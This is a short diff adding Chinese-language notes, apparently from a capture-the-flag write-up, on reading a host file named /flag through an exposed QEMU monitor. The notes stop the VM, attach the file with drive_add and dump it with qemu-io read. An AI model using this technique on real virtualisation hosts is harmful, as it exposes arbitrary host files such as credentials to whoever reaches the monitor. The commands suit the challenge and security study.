@@ -1,0 +1,13 @@
+进入monitor：ctrl A + c
+退出monitor：ctrl A + c
+
+直接利用该漏洞读取flag：
+停止虚拟机
+stop
+添加设备
+drive_add 0 file=/flag,id=flag,format=raw,if=none,readonly=on
+读取设备内容
+qemu-io flag "read -v 0 0x200"
+
+qemu-io> read -v 64k 1k                                  从文件64k编译地址处读取1k数据
+选项-P表示写入数据模式，即十六进制数据；-v表示打印数据，这些命名的参数及使用方法使用help command查询。
